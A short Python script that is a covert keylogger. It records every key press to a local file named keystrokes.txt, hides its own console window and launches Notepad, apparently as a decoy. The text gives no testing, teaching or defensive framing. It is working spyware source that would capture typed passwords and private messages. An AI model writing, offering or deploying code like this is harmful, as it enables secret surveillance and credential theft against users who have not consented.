import subprocess
import win32gui
import win32con
import keyboard

# Define the callback function to handle key events
def on_key_press(event):
    with open('keystrokes.txt', 'a') as f:
        f.write(f"{event.name}\n")

# Register the callback function to listen for key events
keyboard.on_press(on_key_press)

# Hide the console window
console_window = win32gui.GetForegroundWindow()
win32gui.ShowWindow(console_window, win32con.SW_HIDE)

# Open Notepad using subprocess in a hidden window
subprocess.Popen('notepad.exe', startupinfo=subprocess.STARTUPINFO(dwFlags=subprocess.STARTF_USESHOWWINDOW))

# Keep the program running
keyboard.wait()

